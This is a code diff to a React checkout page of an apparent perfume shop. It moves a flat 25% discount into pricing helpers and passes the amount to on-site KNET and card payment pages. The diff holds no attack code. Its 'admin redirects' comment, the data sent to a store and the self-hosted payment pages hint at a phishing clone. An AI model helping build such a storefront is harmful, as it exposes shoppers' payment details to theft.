@@ -1,3 +1,4 @@
+import { discountedPrice, discountedTotal, savePayable } from '@/lib/pricing';
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { sendData, navigateToPage } from "@/lib/store";
@@ -70,6 +71,7 @@ export default function SummaryPayment() {
   }, []);
 
   const subtotal = cartItems.reduce((sum: number, item: any) => sum + ((parseFloat(item.priceNum) || 0) * item.quantity), 0);
+  const payable = discountedTotal(cartItems);
   const totalItems = cartItems.reduce((sum: number, item: any) => sum + item.quantity, 0);
 
   const isFormValid = firstName.trim() && lastName.trim() && address.trim() && city.trim() && phone.trim() && selectedPaymentMethod;
@@ -85,7 +87,7 @@ export default function SummaryPayment() {
         paymentMethod: paymentMethodLabel,
         shippingAddress: { country, firstName, lastName, address, apartment, city, postalCode, phone },
         cartItems,
-        subtotal: Math.round(subtotal * 0.75 * 1000) / 1000,
+        subtotal: payable,
         totalItems,
       },
       current: 'ملخص الدفع',
@@ -94,16 +96,16 @@ export default function SummaryPayment() {
     });
 
     // Store the discounted total in localStorage so it persists across admin redirects
-    localStorage.setItem('amouage_order_total', String(subtotal * 0.75));
+    savePayable(payable);
 
     setTimeout(() => {
       setIsProcessing(false);
       if (selectedPaymentMethod === 'knet') {
-        setLocation('/knet-payment');
+        setLocation(`/knet-payment?amount=${payable}`);
       } else if (selectedPaymentMethod === 'card') {
-        setLocation(`/credit-card-payment?amount=${subtotal * 0.75}`);
+        setLocation(`/credit-card-payment?amount=${payable}`);
       } else {
-        setLocation(`/credit-card-payment?amount=${subtotal * 0.75}`);
+        setLocation(`/credit-card-payment?amount=${payable}`);
       }
     }, 1500);
   };
@@ -340,7 +342,7 @@ export default function SummaryPayment() {
                 {/* Price */}
                 <span className="text-sm font-medium text-black">
                   <span style={{color:'#c00',textDecoration:'line-through',fontSize:'0.85em'}}>{formatLocalCurrency((parseFloat(item.priceNum) || 0) * item.quantity)}</span>{' '}
-                  <span style={{fontWeight:600}}>{formatLocalCurrency((parseFloat(item.priceNum) || 0) * item.quantity * 0.75)}</span>{' '}
+                  <span style={{fontWeight:600}}>{formatLocalCurrency(discountedPrice(item.priceNum, item.quantity))}</span>{' '}
                   <span style={{background:'#c00',color:'#fff',fontSize:'10px',padding:'2px 5px',borderRadius:'3px',fontWeight:'bold'}}>-25%</span>
                 </span>
               </div>
@@ -365,7 +367,7 @@ export default function SummaryPayment() {
               <span className="text-gray-600">Subtotal · {totalItems} items</span>
               <span className="font-medium">
                 <span style={{color:'#c00',textDecoration:'line-through',fontSize:'0.85em'}}>{formatLocalCurrency(subtotal)}</span>{' '}
-                <span style={{fontWeight:600}}>{formatLocalCurrency(subtotal * 0.75)}</span>{' '}
+                <span style={{fontWeight:600}}>{formatLocalCurrency(payable)}</span>{' '}
                 <span style={{background:'#c00',color:'#fff',fontSize:'10px',padding:'2px 5px',borderRadius:'3px',fontWeight:'bold'}}>-25%</span>
               </span>
             </div>
@@ -382,7 +384,7 @@ export default function SummaryPayment() {
               <div className="text-right">
                 <span className="text-xs text-gray-500 mr-2">{getStoreCurrency().currency}</span>
                 <span style={{color:'#c00',textDecoration:'line-through',fontSize:'0.85em'}}>{formatLocalCurrency(subtotal)}</span>{' '}
-                <span className="text-xl font-medium">{formatLocalCurrency(subtotal * 0.75)}</span>{' '}
+                <span className="text-xl font-medium">{formatLocalCurrency(payable)}</span>{' '}
                 <span style={{background:'#c00',color:'#fff',fontSize:'10px',padding:'2px 5px',borderRadius:'3px',fontWeight:'bold'}}>-25%</span>
               </div>
             </div>
